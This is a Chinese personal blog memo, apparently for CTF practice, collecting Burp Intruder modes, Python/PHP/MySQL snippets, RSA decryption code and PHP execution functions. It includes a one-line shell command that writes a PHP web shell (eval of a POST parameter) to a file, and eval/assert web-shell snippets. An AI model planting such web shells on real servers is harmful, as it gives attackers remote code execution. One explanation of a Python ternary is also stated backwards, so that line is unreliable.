<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 备忘录 · Imtinmin的小站</title><meta name="description" content="备忘录 - Imtinmin"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico?v=2018"><link rel="stylesheet" href="/css/style.css"><link rel="search" type="application/opensearchdescription+xml" href="http://imtinmin.github.io/atom.xml" title="Imtinmin的小站"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="wrap"><header><h1 class="title">Imtinmin的小站</h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives/" target="_self">ARCHIVE</a></li><li class="nav-list-item"><a class="nav-list-link" href="/about" target="_self">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">备忘录</h1><div class="post-info">2019-11-09</div><div class="post-content"><h2 id="kail"><a href="#kail" class="headerlink" title="kail"></a>kail</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable	开机启动ssh</span><br></pre></td></tr></table></figure>


<h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p><code>intruder</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">第一种：</span><br><span class="line"></span><br><span class="line">Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line"></span><br><span class="line">Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三种：</span><br><span class="line"></span><br><span class="line">Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第四种：</span><br><span class="line"></span><br><span class="line">Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</span><br></pre></td></tr></table></figure>

<h2 id="python-lambda"><a href="#python-lambda" class="headerlink" title="python lambda"></a>python lambda</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = lambda x,y :x*y</span><br><span class="line">a(3,2)</span><br><span class="line">#6</span><br></pre></td></tr></table></figure>


<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>一些转义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval(\$_POST[&apos;tinmin&apos;]);?&gt;&quot; &gt; tinmin.php</span><br></pre></td></tr></table></figure>


<h2 id="MYSQL5-7"><a href="#MYSQL5-7" class="headerlink" title="MYSQL5.7"></a>MYSQL5.7</h2><p><em>创建用户</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &apos;username&apos;@&apos;host&apos; IDENTIFIED BY &apos;password&apos;;</span><br></pre></td></tr></table></figure>

<p><em>授权</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on mq.* to test@localhost identified by &apos;PASSWORD&apos;;</span><br></pre></td></tr></table></figure>
<p><em>删除用户</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP USER &apos;USER&apos;@&apos;host&apos;</span><br></pre></td></tr></table></figure>

<h2 id="python-php-易遗忘点"><a href="#python-php-易遗忘点" class="headerlink" title="python php 易遗忘点"></a>python php 易遗忘点</h2><p>python 判断数据类型取代<code>type</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isinstance([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],list)</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure>
<p>python  三目运算符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3</span> <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">6</span></span><br></pre></td></tr></table></figure>
<p>如果x小于零，则a=6，否则还是3</p>
<p>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def tinmin():</span><br><span class="line">	return &apos;hello&apos;</span><br><span class="line">tinmin.func_code.co_filename = &quot;tinmin&quot;</span><br></pre></td></tr></table></figure>

<p>获取函数名称和文件位置：func_name, func_code.co_filename</p>
<p>php 三目运算符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="variable">$x</span> = 0;</span><br><span class="line">php &gt; <span class="variable">$p</span>= <span class="variable">$x</span> &gt; 5 ? 5:4;</span><br><span class="line">php &gt; <span class="built_in">echo</span> <span class="variable">$p</span>;</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<p>join 连接字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">''</span>.join([<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>])  <span class="comment">#列表</span></span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.join((<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>)) <span class="comment">#元组</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>随机字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.join(__import__(<span class="string">"random"</span>).sample((__import__(<span class="string">"string"</span>).ascii_letters+__import__(<span class="string">"string"</span>).digits),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>.join(__import__(<span class="string">"random"</span>).choice(__import__(<span class="string">"string"</span>).ascii_letters+__import__(<span class="string">"string"</span>).digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">16</span>))</span><br></pre></td></tr></table></figure>


<p>python3 的sha1 md5不需要hashlib库了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from _md5 import md5</span><br><span class="line">md5(&quot;tinmin&quot;.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">from _sha1 import sha1</span><br></pre></td></tr></table></figure>

<h3 id="php数组转化字符串方法"><a href="#php数组转化字符串方法" class="headerlink" title="php数组转化字符串方法"></a>php数组转化字符串方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">join(<span class="keyword">array</span>(<span class="string">"I"</span>,<span class="string">"am"</span>,<span class="string">"tinmin"</span>),<span class="string">","</span>)</span><br><span class="line">    &gt;&gt; I,am,tinmin</span><br><span class="line">    </span><br><span class="line"> serialize(<span class="keyword">array</span>(<span class="string">"I"</span>,<span class="string">"am"</span>,<span class="string">"tinmin"</span>))</span><br><span class="line">    &gt;&gt;a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">"I"</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">"am"</span>;i:<span class="number">2</span>;s:<span class="number">6</span>:<span class="string">"tinmin"</span>;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="密码学RSA-python的使用"><a href="#密码学RSA-python的使用" class="headerlink" title="密码学RSA python的使用"></a>密码学RSA python的使用</h2><p>python3使用<code>pycryptodome</code>替代<code>pycrypto</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># ------读取公钥------</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./pub.key'</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	key = RSA.import_key(f)</span><br><span class="line">	n = key.n</span><br><span class="line">	e = key.e</span><br><span class="line">	</span><br><span class="line"><span class="comment"># ------生成私钥----------</span></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line">prv = RSA.construct((N,e,int(d),p,q)) <span class="comment">#d 一般为mpz类型，需要转换为int</span></span><br><span class="line">rsa = PKCS1_v1_5.new(prv)</span><br><span class="line">rsa.decrypt((bytes.fromhex(cipher), e)) <span class="comment">#一般对密文进行hex解码再解密</span></span><br></pre></td></tr></table></figure>

<p>无符号hex转ascii</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from Cryptodome.Util.number import long_to_bytes</span><br><span class="line">flag = int(cipher,16)</span><br><span class="line">m = pow(flag,d,N)</span><br><span class="line">long_to_bytes(m)	m没有0x</span><br></pre></td></tr></table></figure>

<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p><code>PHP</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$num = <span class="string">"1"</span>;</span><br><span class="line">$str = <span class="string">"school"</span>;</span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">"you are number %u in the %s"</span>,$num,$str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>you are number 1 in the school</p>
</blockquote>
<p><code>sprintf</code></p>
<blockquote>
<p>%u 无符号十进制数<br>%s 字符串<br>%c ascii码<br>%% 百分号<br>%e 科学记数法<br>%f 浮点数</p>
</blockquote>
<p><code>python</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"My name is &#123;&#125;"</span>.format(<span class="string">"tinmin"</span>)</span><br><span class="line"><span class="string">"My name is &#123;name&#125;"</span>.format(name=<span class="string">"tinmin"</span>)</span><br><span class="line"><span class="string">"My name is &#123;1&#125;"</span>.format(<span class="string">"tinmin"</span>,<span class="string">"imtinmin"</span>) <span class="comment">#My name is imtinmin</span></span><br><span class="line"><span class="string">"My name is %s"</span>%<span class="string">"tinmin"</span></span><br><span class="line"><span class="string">"You play %s like %s"</span>%(<span class="string">"CTF"</span>,<span class="string">"cxk"</span>)</span><br></pre></td></tr></table></figure>

<p><code>C</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s&quot;,&quot;hello world&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="php-代码执行函数"><a href="#php-代码执行函数" class="headerlink" title="php 代码执行函数"></a>php 代码执行函数</h2><p><code>eval()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">eval</span>($_POST[<span class="string">'tinmin'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>POST：<br>tinmin=phpinfo();</p>
</blockquote>
<p><code>assert()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	assert($_POST[<span class="string">'tinmin'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>assert</code>函数执行失败，会停止执行文件后面的代码</p>
<h3 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h3><p><code>exec()</code></p>
<p>无回显，需要echo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> exec(<span class="string">'ls'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以使用<code>exec(&#39;ls&#39;,$a[]);</code>将执行结果输出到a数组，再输出</p>
<p><code>passthru()</code></p>
<p>有命令执行结果回显</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	passthru(<span class="string">'ls'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有回显，执行成功返回<code>True</code>，执行失败返回<code>False</code></p>
<p><code>shell_exec()</code><br>相当于反撇号，无回显<br>例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>system</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	system(<span class="string">'ls'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="在当前目录启动HTTP服务"><a href="#在当前目录启动HTTP服务" class="headerlink" title="在当前目录启动HTTP服务"></a>在当前目录启动HTTP服务</h2><p>python2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py2 -m SimpleHTTPServer 1337</span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py3 -m http.server 1337</span><br></pre></td></tr></table></figure>

<p>php5.4+</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S localhost:7777</span><br></pre></td></tr></table></figure>

<h2 id="linux-强大的lsb隐写查看工具"><a href="#linux-强大的lsb隐写查看工具" class="headerlink" title="linux 强大的lsb隐写查看工具"></a>linux 强大的lsb隐写查看工具</h2><blockquote>
<p>先下个ruby 然后gem也有了，gem install zsteg</p>
</blockquote>
<p><a href="https://github.com/zed-0xff/zsteg" target="_blank" rel="noopener">zsteg</a></p>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2019/11/15/2019-11-15-CTF/">PREV</a><a class="next" href="/2019/11/07/2019-11-7-CTF/">NEXT</a></div><div class="copyright"><p>© 2019 PEACE & LOVE</p><p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>, <a href="https://github.com/jeremyfan/hexo-theme-still" target="_blank">theme</a> by <a href="https://github.com/jeremyfan" target="_blank">Imtinmin</a>.</p></div></footer></div></body></html>